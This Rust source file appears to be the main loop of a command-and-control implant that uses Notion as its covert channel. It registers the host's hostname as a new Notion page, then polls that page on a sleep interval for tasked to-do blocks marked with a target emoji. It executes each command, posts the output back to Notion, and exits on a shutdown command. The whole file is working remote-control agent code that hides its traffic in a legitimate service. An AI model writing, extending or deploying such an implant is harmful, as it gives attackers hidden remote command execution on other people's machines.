extern crate reqwest;
extern crate tokio;
extern crate serde_json;

use std::{thread, time};
use std::env::{args};
use std::process::exit;

use reqwest::{Client};
use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};

mod config;
use config::{
    ConfigOptions,
    get_config_options, 
    get_config_options_debug
};

mod notion;
use notion::{get_blocks, complete_command, create_page, send_result};

mod command;
use command::{NotionCommand, CommandType};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    
    println!("Starting!");
    
    // Handle config options
    let config_options: ConfigOptions;

    // Check for `-d` option
    match args().nth(1) {
        Some(a) => {
            if a == "-d" {
                // Set up async handle for debug
                let config_options_handle = tokio::spawn( async {
                    return get_config_options_debug();
                });
                config_options = config_options_handle.await?.unwrap();
            } else {
                config_options = get_config_options().await?;
            }
        },
        None => {config_options = get_config_options().await?;}
    }
    
    let hn = hostname::get()
        .ok()
        .unwrap()
        .into_string()
        .unwrap();

    println!("{:?}", hn);
    println!("{:?}", config_options);
    let mut headers = HeaderMap::new();
    headers.insert("Notion-Version", "2021-08-16".parse()?);
    headers.insert(CONTENT_TYPE, "application/json".parse()?);
    headers.insert(AUTHORIZATION, format!("Bearer {}", config_options.api_key).parse()?);
    let client = Client::builder()
        .default_headers(headers)
        .build()?;

    let page_id = create_page(&client, &config_options, hn)
        .await
        .unwrap();

    let sleep_time = 
        time::Duration::from_secs(config_options.sleep_interval);
    
    loop {
        // Get Blocks
        let blocks = get_blocks(&client, &page_id).await?;
        let command_blocks: Vec<&serde_json::Value> = blocks
            .as_array()
            .unwrap()
            .into_iter()
            .filter(|&b| b["type"] == "to_do")
            .collect();

        let new_command_blocks: Vec<&serde_json::Value> = command_blocks
            .into_iter()
            .filter(|&b| b["to_do"]["checked"] == false)
            .collect();

        for block in new_command_blocks {
            match block["to_do"]["text"][0]["text"]["content"].as_str() {
                Some(s) => {
                    if s.contains("🎯") {
                        let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                        let output = notion_command.handle().await?;
                        let command_block_id = block["id"].as_str().unwrap();
                        complete_command(&client, block.to_owned()).await;
                        send_result(&client, command_block_id, output).await;
                        // Check for any final work based on command type,
                        // Like shutting down the agent
                        match notion_command.commmand_type {
                            CommandType::Shutdown => {exit(0);},
                            _ => {}
                        }
                    };

                },
                None => { continue; }
            }
        }

        thread::sleep(sleep_time);
        println!("ZZZZ");
    }
}
